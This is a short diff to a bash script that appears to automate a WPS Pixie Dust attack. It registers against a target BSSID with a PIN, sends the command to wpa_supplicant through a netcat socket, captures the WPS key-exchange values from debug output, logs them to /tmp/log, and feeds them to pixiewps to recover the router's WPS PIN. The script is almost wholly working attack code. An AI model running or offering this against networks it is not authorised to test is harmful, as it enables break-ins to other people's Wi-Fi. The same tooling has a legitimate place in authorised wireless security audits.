@@ -26,7 +26,7 @@ function gethex()
 
 echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE
 
-echo "wps_reg $BSSID $PIN" | wpa_cli -B -i $IFACE -p $TEMPDIR &
+sleep 2 && echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &
 
 while read -r LINE
 do
@@ -75,7 +75,7 @@ do
 		break
 	fi
 
-done <<<$(wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | awk '$1 == "WPS:" {print $0}')
+done <<<$(wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | tee /tmp/log | awk '$1 == "WPS:" {print $0}')
 
 pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force
 
